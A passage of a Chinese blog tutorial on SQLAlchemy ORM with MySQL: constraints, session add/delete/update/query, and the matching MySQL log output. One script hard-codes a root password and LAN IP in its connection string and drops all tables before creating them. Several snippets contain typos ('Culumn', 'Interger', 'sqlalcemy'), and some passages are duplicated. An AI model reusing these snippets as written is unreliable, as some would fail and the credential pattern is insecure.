punctuation">,</span>            create_time<span class="token operator">=</span>date<span class="token punctuation">(</span>year<span class="token operator">=</span><span class="token number">2001</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>day<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            create_time_1<span class="token operator">=</span>datetime<span class="token punctuation">(</span>year<span class="token operator">=</span><span class="token number">2017</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>day<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>hour<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>minute<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>second<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>microsecond<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            create_time_2<span class="token operator">=</span>time<span class="token punctuation">(</span>hour<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>minute<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>second<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>microsecond<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            author_introduction<span class="token operator">=</span><span class="token string">'Popular People'</span><span class="token punctuation">,</span>            category<span class="token operator">=</span><span class="token string">'Python'</span><span class="token punctuation">,</span>            price<span class="token operator">=</span><span class="token number">8888.8888</span>            <span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>art1<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面会详细讲解添加数据.</p></blockquote><h4 id="2-Column列级别约束"><a href="#2-Column列级别约束" class="headerlink" title="2.Column列级别约束"></a>2.<code>Column</code>列级别约束</h4><blockquote><p><code>SQL</code> 语法中,约束分为表级别约束和列级别约束.</p><p>列级别约束:</p><ul><li><code>PRIMARY KEY</code>:主键约束</li><li><code>FOREIGN KEY</code>:外键约束,不允许重复</li><li><code>UNIQUE</code>:唯一性约束</li><li><code>NOT NULL</code>:非空约束</li><li><code>DEFAULT</code>:默认约束</li><li><code>CHECK</code>: 检查约束</li></ul><p>表级别约束:</p><ul><li><code>PRIMARY KEY</code>:主键约束</li><li><code>FOREIGN KEY</code>:外键约束,不允许重复</li><li><code>UNIQUE</code>:唯一性约束</li></ul><p>他们的区别是:</p><ul><li>列级别约束只能应用与一列上,而表级别约束可以用在多个列上.</li><li>列级别约束直接跟在列后,不用指定列名.而表级别约束必须指定约束列名称.</li></ul><hr><p>这里的<code>Column</code> 函数主要是用来定义列级别的约束的.</p><p><code>SQLAlchemy</code> 与<code>Mysql</code> 中常用约束的对应.</p><hr><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Culumn<span class="token comment" spellcheck="true"># Column 中自带的属性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><table><thead><tr><th><code>SQLAlchemy</code></th><th><code>MySQL</code></th></tr></thead><tbody><tr><td><code>primary_key=True</code></td><td><code>PRIMARY KEY</code></td></tr><tr><td>需要导入模块</td><td><code>FOREIGN KEY</code></td></tr><tr><td><code>unique=True</code></td><td><code>UNIQUE</code></td></tr><tr><td><code>nullable=True</code></td><td><code>NOT NULL</code></td></tr><tr><td><code>default=xxx</code></td><td><code>DEFAULT</code></td></tr><tr><td><code>name</code></td><td>指定类的别名<code>AS</code></td></tr><tr><td><code>autoincrement=True</code></td><td><code>AUTO_INCREMENT</code></td></tr><tr><td><code>comment</code> 列的描述字符</td><td><code>COMMENT</code></td></tr><tr><td><code>index=primary_key</code></td><td><code>INDEX</code></td></tr></tbody></table><hr><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#  需要导入 外键 类来实现Column中外键的约束</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> ForeignKey<span class="token keyword">class</span> <span class="token class-name">Child</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'child'</span>        id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'Parent'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    child_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Interger<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'child.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这里指定的是表名和字段   </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-表级别约束"><a href="#3-表级别约束" class="headerlink" title="3.表级别约束"></a>3.表级别约束</h4><blockquote><p><a href="https://docs.sqlalchemy.org/en/13/core/constraints.html?highlight=primarykeyconstraint#primary-key-constraint" target="_blank" rel="noopener">官网</a></p><p><code>Column</code> 中定义了列级别的约束.如果要定义表级别的约束,需要导入相关的模块</p><pre class="line-numbers language-python">from sqlalchemy import ForeignKeyConstraint,UniqueConstraint,PrimaryKeyConstraint</code></pre><p>它的创建类似与这样</p><pre><code class="python"><code class="language-python">from sqlalchemy import ForeignKeyConstraint,UniqueConstraint,PrimaryKeyConstraint</code></pre><p>它的创建类似与这样</p><pre><code class="python"># 表级别外键约束from sqlalcemy import Table# 注意,这里导入的是 Table 对象invoice_item = Table('invoice_item', metadata,     Column('item_id', Integer, primary_key=True),    Column('item_name', String(60), nullable=False),     Column('invoice_id', Integer, nullable=False),     Column('ref_num', Integer, nullable=False),     ForeignKeyConstraint(['invoice_id', 'ref_num'], ['invoice.invoice_id', 'invoice.ref_num']))# 表级别唯一约束mytable = Table('mytable', metadata,    # per-column anonymous unique constraint     Column('col1', Integer, unique=True),     Column('col2', Integer),     Column('col3', Integer),     # explicit/composite unique constraint.  'name' is optional.     UniqueConstraint('col2', 'col3', name='uix_1') )# 主键约束my_table = Table('mytable', metadata,    Column('id', Integer),    Column('version_id', Integer),    Column('data', String(50)),    PrimaryKeyConstraint('id', 'version_id', name='mytable_pk')     )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="8-单表操作"><a href="#8-单表操作" class="headerlink" title="8.单表操作"></a>8.单表操作</h3><blockquote><p>首先创建如下映射表:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'users'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    fullname <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""非必须,说明"""</span>        <span class="token keyword">return</span> <span class="token string">'&lt;User(name={}, fullname={}, passoword={})'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>fullname<span class="token punctuation">,</span> self<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>drop_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行</p><pre class="line-numbers language-bash">$ python 3单表操作.py</code></pre><p>以下是利用<code>session</code>对象的<code>query</code> 去增删改查数据库中的表.</p></blockquote><h4 id="1-表的操作-增-insert-into"><a href="#1-表的操作-增-insert-into" class="headerlink" title="1.表的操作-增(insert into)"></a>1.表的操作-增(<code>insert into</code>)</h4><blockquote><p>在<code>mysql</code>中查看表</p><pre><code class="sql"><code class="language-bash">$ python 3单表操作.py</code></pre><p>以下是利用<code>session</code>对象的<code>query</code> 去增删改查数据库中的表.</p></blockquote><h4 id="1-表的操作-增-insert-into"><a href="#1-表的操作-增-insert-into" class="headerlink" title="1.表的操作-增(insert into)"></a>1.表的操作-增(<code>insert into</code>)</h4><blockquote><p>在<code>mysql</code>中查看表</p><pre><code class="sql">mysql root@192.168.0.101:sqlalchemy> show tables;     +----------------------+| Tables_in_sqlalchemy |+----------------------+| articles             || testuser_1           || users                |+----------------------+mysql root@192.168.0.101:sqlalchemy> show create table users;   +-------+-----------------------------------------+| Table | Create Table                            |+-------+-----------------------------------------+| users | CREATE TABLE `users` (                  ||       |   `id` int(11) NOT NULL AUTO_INCREMENT, ||       |   `name` varchar(45) DEFAULT NULL,      ||       |   `fullname` varchar(45) DEFAULT NULL,  ||       |   `password` varchar(45) DEFAULT NULL,  ||       |   PRIMARY KEY (`id`)                    ||       | ) ENGINE=InnoDB DEFAULT CHARSET=utf8    |+-------+-----------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>session.add()</code>或<code>session.add_all()</code>来插入数据.</p><hr><p>为了方便,以下将使用<code>jupyter-notebook</code>建立<code>ORM</code>映射并操作.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10221.png" alt="10221"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 新生成一个实例</span><span class="token operator">>></span><span class="token operator">></span> instance1 <span class="token operator">=</span> User<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'testA'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">'testA H'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'testA'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># session.add 添加实例</span><span class="token operator">>></span><span class="token operator">></span> session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>instance1<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 上面我们说过 session 是 autoflush=True,但是 autocommit=False</span><span class="token comment" spellcheck="true"># 所以这里虽然 add 添加了数据,但是并没有 commit 提交数据,事务是不完整的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们没有执行<code>query</code>之前,还没有<code>flush</code>到数据库中,而且并没有写入数据库</p><pre class="line-numbers language-bash">&gt;&gt;&gt; query1 = session.query(User).all()</code></pre><p>执行完后,就可以在<code>MySQL</code>日志文件中查看</p><pre><code class="bash"><code class="language-bash">&gt;&gt;&gt; query1 = session.query(User).all()</code></pre><p>执行完后,就可以在<code>MySQL</code>日志文件中查看</p><pre><code class="bash">$ tail -20 /mysql_data/localhost.log...INSERT INTO users (id, name, fullname, password) VALUES (1, 'testA', 'testA H', 'testA')SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在日志中查看到<code>insert into</code>语句,如果在数据库中查看文件</p><pre class="line-numbers language-sql"><code class="language-sql">mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>     <span class="token operator">+</span><span class="token comment" spellcheck="true">----+------+----------+----------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name <span class="token operator">|</span> fullname <span class="token operator">|</span> password <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+------+----------+----------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到表中是没有数据的,因为并没有执行<code>session.commit()</code>,并没有提交数据到数据库.</p><p>提交事务:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 如果不使用session 需要关闭它</span><span class="token comment" spellcheck="true"># session.close()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>插入多条数据:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># session.add_all 添加要给列表</span>session<span class="token punctuation">.</span>add_all<span class="token punctuation">(</span><span class="token punctuation">[</span> User<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'wendy'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">'wendy williams'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'foobar'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> User<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'mary'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">'mary C'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'xxg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> User<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'fred'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">'fred nn'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 提交事务</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭 session</span><span class="token comment" spellcheck="true"># session1.close()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看数据库:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>          <span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------+----------------+----------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name  <span class="token operator">|</span> fullname       <span class="token operator">|</span> password <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------+----------------+----------+</span><span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> testA <span class="token operator">|</span> testA H        <span class="token operator">|</span> <span class="token number">123456</span>   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> wendy <span class="token operator">|</span> wendy williams <span class="token operator">|</span> foobar   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> mary  <span class="token operator">|</span> mary C         <span class="token operator">|</span> xxg      <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> fred  <span class="token operator">|</span> fred nn        <span class="token operator">|</span> <span class="token number">123</span>      <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------+----------------+----------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-表的操作-删-delete"><a href="#2-表的操作-删-delete" class="headerlink" title="2.表的操作-删(delete)"></a>2.表的操作-删(<code>delete</code>)</h4><blockquote><p>在<code>mysql</code> 数据库中删除数据使用<code>delete</code> 语句,对应到<code>sqlalchemy</code>中:</p><ul><li>批量删除:<code>session.query().delete()</code>方法,可以删除单个或多个.<a href="https://docs.sqlalchemy.org/en/13/orm/query.html?highlight=query#sqlalchemy.orm.query.Query.delete" target="_blank" rel="noopener">扩展阅读</a></li><li>删除单个:<code>session.delete(instance)</code>.<a href="https://docs.sqlalchemy.org/en/13/orm/session_api.html?highlight=delete#sqlalchemy.orm.session.Session.delete" target="_blank" rel="noopener">扩展阅读</a></li></ul><p>删除数据:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 删除数据</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> or_q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>or_<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id <span class="token operator">></span><span class="token number">3</span><span class="token punctuation">,</span> User<span class="token punctuation">.</span>id<span class="token operator">==</span><span class="token number">3</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>mysql</code> 日志:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -20 /mysql_data/localhost.log</span><span class="token punctuation">..</span>.DELETE FROM <span class="token function">users</span> WHERE users.id <span class="token operator">></span> 3 OR users.id <span class="token operator">=</span> 3<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>也可以使用另外一种删除方式:</p><pre class="line-numbers language-python"><code class="language-python">q3 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>q3<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-表的操作-改-‘update’"><a href="#3-表的操作-改-‘update’" class="headerlink" title="3.表的操作-改(‘update’)"></a>3.表的操作-改(‘update’)</h4><blockquote><p>在<code>mysql</code> 数据库中增加数据使用<code>update</code> 语句,对应到<code>sqlalchemy</code> 中,</p><ul><li>批量更新.它使用的是<code>session.query().update()</code> 的方法.<a href="https://docs.sqlalchemy.org/en/13/orm/query.html?highlight=query#sqlalchemy.orm.query.Query.update" target="_blank" rel="noopener">阅读</a></li></ul><p>更改<code>id=1</code> 的行的<code>password</code> 字段</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 更改,更改id=1的password</span><span class="token comment" spellcheck="true"># 注意:update 加入的是一个 dict数据类型</span>q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'new_passwd'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q4<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>mysql</code>日志</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -20 /mysql_data/localhost.log</span><span class="token punctuation">..</span>.Query    UPDATE <span class="token function">users</span> SET password<span class="token operator">=</span><span class="token string">'new_passwd'</span> WHERE users.id <span class="token operator">=</span> 1Query    COMMIT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-表的操作-查-select"><a href="#4-表的操作-查-select" class="headerlink" title="4.表的操作-查(select)"></a>4.表的操作-查(<code>select</code>)</h4><blockquote><p>在<code>mysql</code> 数据库中增加数据使用<code>select</code> 语句,对应到<code>sqlalchemy</code> 中,它使用的是<code>session.query()</code> 的方法.</p></blockquote><h5 id="1-基本查询"><a href="#1-基本查询" class="headerlink" title="1.基本查询"></a>1.基本查询</h5><blockquote><ol><li>查询表的信息</li></ol><pre class="line-numbers language-mysql"><code class="language-mysql"># 查询单张表>>> q5 = session.query(User)>>> print(q5)"""SELECT `Users`.id AS `Users_id`, `Users`.name AS `Users_name`, `Users`.fullname AS `Users_fullname`, `Users`.password AS `Users_password` FROM `Users`"""# 它返回的对象是一个可迭代对象,可以使用 for 读取其中的信息>>> print(type(q5))"""<class 'sqlalchemy.orm.query.Query'>""">>> from collections import Iterable>>> isinstance(q5, Iterable)# True>>> for instance in session1.query(User):>>>     print(instance.id, instance.name)"""1 testA2 wendy"""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>查询表的字段</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 查询表的字段</span>q6 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token punctuation">,</span> User<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q6<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT users.id AS users_id, users.name AS users_name FROM users"""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> q6<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>id<span class="token punctuation">,</span>i<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""1 testA2 wendy"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>通过查询,可以构造一个<code>python</code>对象</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 查询表和字段,返回一个列表包裹的元组</span>q7 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 返回所有的行</span><span class="token keyword">print</span><span class="token punctuation">(</span>q7<span class="token punctuation">)</span>type<span class="token punctuation">(</span>q7<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""[&lt;User(name=testA, fullname=testA H, passoword=new_passwd), &lt;User(name=wendy, fullname=wendy williams, passoword=foobar)]list"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>为查询的字段起别名,相当于<code>mysql</code>的<code>as</code>字句</li></ol><pre class="line-numbers language-python"><code class="language-python">q8 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token punctuation">.</span>label<span class="token punctuation">(</span><span class="token string">'myid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q8<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> q8<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>myid<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT users.id AS myid FROM users WHERE users.id &lt; %(id_1)s12"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>查询多个字段,可一个给多个字段起一个别名</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> aliased<span class="token operator">>></span><span class="token operator">></span> user_alias <span class="token operator">=</span> aliased<span class="token punctuation">(</span>User<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'user_alias'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> row <span class="token keyword">in</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>user_alias<span class="token punctuation">,</span> user_alias<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">.</span>user_alias<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h5 id="2-查询时where子句"><a href="#2-查询时where子句" class="headerlink" title="2.查询时where子句"></a>2.查询时<code>where</code>子句</h5><blockquote><p>在<code>sqlalchemy</code> 中,它使用的是<code>session.query().filter()</code> 方法来表示<code>mysql</code> 中的<code>where</code> 子句.</p><p>主要有2个方法:</p><ul><li><code>fiter_by()</code>: 使用关键字表达式<code>session.query(MyClass).filter_by(name = &#39;some name&#39;, id = 5)</code></li><li><code>filter()</code>:使用的是<code>class.attribute</code> 的方式</li></ul><p>在<code>filter()</code>中对应的判断条件有:</p><table><thead><tr><th><code>SQL</code></th><th><code>SQLAlchemy</code></th><th>举例</th><th>说明</th></tr></thead><tbody><tr><td><code>=</code></td><td><code>==</code></td><td><code>query.filter(user.name == 